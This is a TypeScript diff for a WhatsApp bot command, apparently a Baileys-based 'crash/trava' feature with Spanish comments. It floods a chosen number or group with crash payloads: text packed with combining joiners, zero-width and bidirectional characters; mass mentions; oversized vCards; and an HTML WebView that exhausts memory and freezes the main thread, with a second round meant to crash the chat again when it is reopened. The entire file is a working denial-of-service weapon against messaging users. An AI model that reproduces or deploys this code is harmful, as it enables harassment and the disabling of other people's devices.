@@ -3,29 +3,31 @@ import { fytBold } from "../../core/socketText.ts";
 
 /* ───────────────────────── generadores ───────────────────────── */
 
+const CGJ = "\u034f";          // combining grapheme joiner — el núcleo del trava-zap
+const CGJ2 = "\u0300\u034f\u0301\u034f\u0316\u034f\u0335\u034f";
 const ZW = "\u200b\u200c\u200d\u2060\ufeff";
 const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";
 
-/** bomba de shaping: miles de diacríticos combinantes sobre una sola base */
-function shapeBomb(n: number) {
-  const marks = ["\u0301", "\u0308", "\u0302", "\u0303", "\u0304", "\u0335", "\u035c", "\u034f"];
+function cgj(n: number) {
   let out = "";
-  for (let i = 0; i < n; i++) out += marks[i % marks.length];
-  return "a" + out;
+  const chunk = CGJ2.repeat(Math.ceil(n / 8));
+  out = chunk.slice(0, n);
+  return out;
 }
 
-function invisibleBomb(n: number) {
+function zwBomb(n: number) {
   let out = "";
-  for (let i = 0; i < n; i++) out += ZW[i % ZW.length] + RTL[i % RTL.length];
+  for (let i = 0; i < n; i++) out += ZW[i % 5] + RTL[i % 10];
   return out;
 }
 
 function textBomb(level: number) {
-  const scale = level >= 3 ? 3 : level >= 2 ? 2 : 1;
+  const s = level >= 3 ? 3 : level >= 2 ? 2 : 1;
   return (
-    "💥 " + shapeBomb(4000 * scale) + "\n\n" +
-    invisibleBomb(9000 * scale) + "\n\n" +
-    "█".repeat(4000 * scale)
+    "💥 " + cgj(18000 * s) + "\n\n" +
+    "🎉".repeat(9000 * s) + "\n\n" +
+    zwBomb(4000 * s) + "\n\n" +
+    "█".repeat(3000 * s)
   );
 }
 
@@ -33,92 +35,79 @@ function mentionBomb(num: string, times: number) {
   return `@${num} `.repeat(times).trim();
 }
 
-const PNG = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
-
-/* ───────────────────────── bomba WebView ───────────────────────── */
+/* ───────────────────────── bomba WebView (OOM) ───────────────────────── */
 
 function buildWebviewBomb(targetName: string, level: number) {
-  const loops = 220_000 * level;
-  const imgLoads = 1200 * level;
-  const domPerTick = 90 * level;
-  const alerts = level >= 3 ? 26 : level >= 2 ? 12 : 5;
+  const mb = 3 * level;            // MB por string
+  const blocks = 40 * level;       // nº de strings
+  const canvases = 30 * level;     // dataURIs grandes
+  const nodes = 40000 * level;
 
   const html = `<style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#05020c;color:#f5f3ff;padding:10px}
 .card{max-width:380px;margin:0 auto;background:linear-gradient(180deg,#130826,#070312);border:2px solid #7c3aed;border-radius:16px;padding:14px;text-align:center}
-.t{font-size:16px;font-weight:900;color:#00ffcc;letter-spacing:1px;margin-bottom:6px}
-.d{font-size:11.5px;color:#c4b5fd;line-height:1.4;margin-bottom:10px}
+.t{font-size:15px;font-weight:900;color:#00ffcc;letter-spacing:1px;margin-bottom:6px}
+.d{font-size:11.5px;color:#c4b5fd;line-height:1.4;margin-bottom:8px}
 .s{font-size:10px;color:#7c3aed;font-family:monospace}
-#flood{text-align:left;font-family:monospace;font-size:8px;color:#4c1d95;word-break:break-all;margin-top:8px;max-height:120px;overflow:hidden}
+#f{text-align:left;font-family:monospace;font-size:7px;color:#3b0f80;word-break:break-all;margin-top:8px;height:90px;overflow:hidden}
 </style>
 <div class="card">
-  <div class="t" id="h">CRASH // ${targetName.replace(/[<>&"]/g, "")}</div>
-  <div class="d">Bomba de memoria + hilo principal. No cierres la tarjeta.</div>
+  <div class="t" id="h">OOM // ${targetName.replace(/[<>&"]/g, "")}</div>
+  <div class="d">Agotando memoria. No cierres la tarjeta.</div>
   <div class="s" id="st">fase 0</div>
-  <div id="flood"></div>
+  <div id="f"></div>
 </div>
 <script>
-var st = document.getElementById('st');
-function fase(n){ st.textContent = 'fase ' + n }
+var st=document.getElementById('st'),f=document.getElementById('f');
+var hoard=[],imgs=[];
+function fase(n){try{st.textContent='fase '+n}catch(e){}}
+function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,16)})}catch(e){setTimeout(fn,16)}}
 
-/* 1) presión de memoria: strings y arrays gigantes */
-try {
+/* 1 · presión bruta de memoria */
+next(function(){
   fase(1);
-  var arr = [];
-  for (var i = 0; i < ${loops}; i++) arr.push(new Array(96).join('█'));
-  window.__hoard = arr;
-} catch (e) {}
+  try{ for(var i=0;i<${blocks};i++) hoard.push('█'.repeat(${mb}*1000000)) }catch(e){}
+  next(fase2);
+});
 
-/* 2) inundación de DOM */
-try {
+/* 2 · dataURIs gigantes vía canvas (cada una decodifica MB) */
+function fase2(){
   fase(2);
-  var flood = document.getElementById('flood');
-  var tick = 0;
-  window.__flood = setInterval(function () {
-    for (var i = 0; i < ${domPerTick}; i++) {
-      var d = document.createElement('div');
-      d.textContent = '█'.repeat(300) + Math.random();
-      flood.appendChild(d);
-    }
-    if (++tick > 400) { flood.innerHTML = ''; tick = 0; }
-  }, 40);
-} catch (e) {}
-
-/* 3) decodificación masiva de imágenes */
-try {
-  fase(3);
-  var src = 'data:image/png;base64,${PNG}';
-  window.__imgs = [];
-  for (var k = 0; k < ${imgLoads}; k++) {
-    var im = new Image();
-    im.src = src;
-    window.__imgs.push(im);
-  }
-} catch (e) {}
-
-/* 4) desbordamiento de pila */
-try {
-  fase(4);
-  function rec(n) { return rec(n + 1) + 1 }
-  rec(0);
-} catch (e) {}
-
-/* 5) tormenta de alertas (cada una bloquea el hilo) */
-fase(5);
-var a = 0;
-function storm() {
-  if (a++ >= ${alerts}) return void fin();
-  alert('CRASH ' + a + '/' + ${alerts});
-  storm();
+  try{
+    var c=document.createElement('canvas'); c.width=900; c.height=900;
+    var g=c.getContext('2d');
+    var d=g.createImageData(900,900);
+    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
+    g.putImageData(d,0,0);
+    var uri=c.toDataURL();
+    for(var k=0;k<${canvases};k++){var im=new Image();im.src=uri;imgs.push(im)}
+  }catch(e){}
+  next(fase3);
 }
-storm();
 
-/* 6) bloqueo definitivo del hilo -> ANR */
-function fin() {
-  fase(6);
-  var t0 = Date.now();
-  while (true) { if (Date.now() - t0 > 600000) break }
+/* 3 · inundación de DOM de golpe */
+function fase3(){
+  fase(3);
+  try{
+    var frag=document.createDocumentFragment();
+    for(var i=0;i<${nodes};i++){
+      var el=document.createElement('div');
+      el.textContent='█'.repeat(200)+Math.random();
+      frag.appendChild(el);
+    }
+    f.appendChild(frag);
+  }catch(e){}
+  next(fase4);
+}
+
+/* 4 · segundo colchón + bloqueo definitivo (ANR) */
+function fase4(){
+  fase(4);
+  try{ for(var i=0;i<${blocks};i++) hoard.push(new Array(200000).join('▓')) }catch(e){}
+  fase(5);
+  var t0=Date.now();
+  while(true){ if(Date.now()-t0>900000) break }
 }
 </script>`;
 
@@ -137,18 +126,18 @@ function fin() {
 /* ───────────────────────── contact bomb ───────────────────────── */
 
 function buildContacts(count: number, level: number) {
-  const name = shapeBomb(300 * level);
+  const heavy = cgj(2200 * level) + zwBomb(400 * level);
   const list = [];
   for (let i = 0; i < count; i++) {
     const n = `000000${i}`.slice(-6);
     list.push({
       vcard:
-        `BEGIN:VCARD\nVERSION:3.0\nFN:${name}${n}\n` +
-        `N:${n};${name};;;\n` +
+        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\n` +
+        `N:${n};${heavy};;;\n` +
         `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
     });
   }
-  return { displayName: `💥 ${shapeBomb(120 * level)}`, contacts: list };
+  return { displayName: `💥 ${heavy.slice(0, 1200)}`, contacts: list };
 }
 
 /* ───────────────────────── comando ───────────────────────── */
@@ -156,92 +145,93 @@ function buildContacts(count: number, level: number) {
 export default {
   name: ["crash", "trava", "travar"],
   category: "group",
-  description: "Bombea a un número con payloads pesados (WebView, texto, menciones y vCards) hasta congelarlo.",
+  description: "Bombea a un número hasta congelarlo: CGJ, emoji, menciones, vCards y OOM de WebView.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
     const quoted = (msg.message as any)?.extendedTextMessage?.contextInfo?.participant;
     const sender: string = (msg.key as any).participant || from;
 
-    let raw = (args[0] || "").replace(/\D/g, "");
-    let target = "";
+    const a0 = (args[0] || "").trim();
+    const raw = a0.replace(/\D/g, "");
+    let target: string;
 
-    if (args[0] && /^(grupo|g|chat)$/i.test(args[0])) target = from;
+    if (/^(grupo|g|chat)$/i.test(a0)) target = from;
     else if (raw.length >= 8) target = `${raw}@s.whatsapp.net`;
     else if (quoted) target = quoted;
     else target = sender;
 
-    const level = Math.min(3, Math.max(1, Number(args[1] || args[0] && target !== from ? 2 : 2) || 2));
+    const lvArg = Number(args.find((a) => /^[123]$/.test(a)) || 0);
+    const level = lvArg || 3;
 
+    const isGroup = target.endsWith("@g.us");
     const num = target.split("@")[0].split(":")[0];
 
     await react("💥").catch(() => undefined);
 
     let name = num;
     try {
-      if (target.endsWith("@g.us")) {
-        const meta: any = await sock.groupMetadata(target);
-        name = meta.subject || num;
-      } else {
-        name = String((msg as any).pushName || "").trim() || num;
-      }
+      if (isGroup) name = (await sock.groupMetadata(target)).subject || num;
+      else name = String((msg as any).pushName || "").trim() || num;
     } catch {}
 
-    const phases: string[] = [];
+    const done: string[] = [];
+    let lastKey: any = msg;
 
-    const run = async (label: string, fn: () => Promise<any>) => {
-      try { await fn(); phases.push(`✅ ${label}`); }
-      catch (e: any) { phases.push(`⚠️ ${label}: ${e?.message || e}`); }
+    const fire = async (label: string, fn: (q: any) => Promise<any>) => {
+      try {
+        const r = await fn(lastKey);
+        if (r?.key) lastKey = r;
+        done.push(`✅ ${label}`);
+      } catch (e: any) {
+        done.push(`⚠️ ${label}: ${e?.message || e}`);
+      }
     };
 
-    /* 1 · texto + mención bomba */
-    await run("texto", () =>
-      sock.sendMessage(target, {
-        text: `${fytBold("💥 IMPACTO")} nivel ${level}\n\n${textBomb(level)}`,
-        mentions: [target.endsWith("@g.us") ? sender : target],
-      }, { quoted: level >= 2 ? msg : undefined }),
-    );
+    const mention = isGroup ? sender : target;
 
-    /* 2 · mención bomba */
-    await run("menciones", () =>
-      sock.sendMessage(target, {
-        text: mentionBomb(target.endsWith("@g.us") ? num : num, 800 * level),
-        mentions: Array(800 * level).fill(target.endsWith("@g.us") ? sender : target),
-      }),
-    );
+    /* 1 · texto CGJ, encadenado en cita para forzar re-render del preview */
+    await fire("texto", (q) =>
+      sock.sendMessage(target, { text: textBomb(level), mentions: [mention] }, { quoted: q }));
 
-    /* 3 · bomba de WebView */
-    await run("webview", async () => {
+    /* 2 · mención masiva */
+    await fire("menciones", () =>
+      sock.sendMessage(target, {
+        text: mentionBomb(num, 700 * level),
+        mentions: Array(700 * level).fill(mention),
+      }, { quoted: lastKey }));
+
+    /* 3 · vCard bomb */
+    await fire("vcards", () =>
+      sock.sendMessage(target, { contacts: buildContacts(60 * level, level) }, { quoted: lastKey }));
+
+    /* 4 · OOM de WebView */
+    await fire("webview", async (q) => {
       const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
       const rich = new AIRich(sock)
         .setTitle("💥 CRASH // LuferOS")
-        .setFooter(`nivel ${level} · no cierres la tarjeta`);
+        .setFooter(`nivel ${level} · OOM`);
       rich.addSection(buildWebviewBomb(name, level));
-      await rich.send(target);
+      return rich.send(target, { quoted: q });
     });
 
-    /* 4 · contact bomb */
-    if (level >= 2) {
-      await run("vcards", () => sock.sendMessage(target, { contacts: buildContacts(90 * level, level) }));
-    }
-
-    /* 5 · segunda ronda de WebView para el crash al reabrir */
+    /* 5 · segunda ronda para el crash al reabrir el chat */
     if (level >= 3) {
-      await run("webview x2", async () => {
+      await fire("webview x2", async (q) => {
         const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
-        const rich = new AIRich(sock).setTitle("💥 CRASH 2 // LuferOS").setFooter("reapertura");
+        const rich = new AIRich(sock).setTitle("☠️ CRASH 2 // LuferOS").setFooter("reapertura");
         rich.addSection(buildWebviewBomb(name, 3));
-        await rich.send(target);
+        return rich.send(target, { quoted: q });
       });
-      await run("texto x2", () => sock.sendMessage(target, { text: textBomb(3) }));
+      await fire("texto x2", (q) => sock.sendMessage(target, { text: textBomb(3) }, { quoted: q }));
     }
 
     await react("☠️").catch(() => undefined);
 
     await reply(
-      `${fytBold("Bomba enviada")} → ${target.endsWith("@g.us") ? "este grupo" : `@${num}`}\n` +
-        `Nivel: ${level}\n\n${phases.join("\n")}`,
-      { mentions: [target.endsWith("@g.us") ? sender : target] } as any,
+      `${fytBold("Bomba enviada")} → ${isGroup ? "este grupo" : `@${num}`}\n` +
+        `Nivel: ${level}\n\n${done.join("\n")}`,
+      { mentions: [mention] } as any,
     ).catch(() => undefined);
   },
 };
